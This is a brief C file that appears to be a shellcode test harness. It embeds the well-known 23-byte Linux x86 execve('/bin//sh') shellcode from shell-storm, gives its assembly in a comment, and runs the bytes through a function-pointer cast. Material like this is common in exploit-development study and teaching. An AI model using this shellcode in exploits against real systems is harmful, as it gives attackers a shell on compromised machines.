/*
 * http://shell-storm.org/shellcode/files/shellcode-827.php
*/
#include <stdlib.h>
#include <stdio.h>

/*
	xor    %eax,%eax
	push   %eax
	push   $0x68732f2f
	push   $0x6e69622f
	mov    %esp,%ebx
	push   %eax
	push   %ebx
	mov    %esp,%ecx
	mov    $0xb,%al
	int    $0x80
*/

const char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                    "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char ** argv)
{
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();

    return 0;
}

